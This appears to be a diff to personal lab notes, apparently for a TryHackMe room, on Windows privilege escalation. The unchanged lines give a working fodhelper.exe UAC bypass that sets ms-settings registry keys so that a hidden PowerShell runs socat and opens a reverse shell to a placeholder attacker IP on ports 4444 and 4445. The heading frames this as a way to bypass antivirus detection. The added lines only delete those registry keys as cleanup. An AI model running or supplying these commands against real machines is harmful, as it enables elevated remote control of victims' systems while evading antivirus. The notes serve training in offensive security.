@@ -616,6 +616,9 @@ reg add %REG_KEY% /v "DelegateExecute" /d "" /f
 reg add %REG_KEY% /d %CMD% /f
 fodhelper.exe
 
+
+#clean
+reg delete HKCU\Software\Classes\ms-settings\ /f
 ```
 
 **Bypass AV detection**
@@ -628,11 +631,19 @@ set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
 set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
 reg add %REG_KEY% /v "DelegateExecute" /d "" /f
 reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
+## clean
+reg delete HKCU\Software\Classes\ms-settings\ /f
+
 
 # different registry keys 
 set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
 reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
 reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
 fodhelper.exe
+
+## clean
+reg delete "HKCU\Software\Classes\.thm\" /f
+reg delete "HKCU\Software\Classes\ms-settings\" /f
+
 ```
 
